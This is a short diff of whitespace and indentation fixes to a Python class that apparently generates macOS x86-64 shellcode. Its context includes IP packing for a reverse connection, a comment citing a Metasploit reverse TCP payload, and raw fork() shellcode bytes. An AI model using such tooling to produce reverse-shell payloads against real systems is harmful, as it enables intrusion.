@@ -50,7 +50,7 @@ class macho_intel64_shellcode():
     def pack_ip_addresses(self):
         hostocts = []
         for i, octet in enumerate(self.HOST.split('.')):
-                hostocts.append(int(octet))
+            hostocts.append(int(octet))
         self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                   hostocts[2], hostocts[3])
         return self.hostip
@@ -198,7 +198,7 @@ class macho_intel64_shellcode():
             supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
 
         #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
-        
+
         self.shellcode2 = supplied_shellcode
 
         self.shellcode1 = ("\xB8\x02\x00\x00\x02\x0f\x05\x85\xd2")  # FORK()
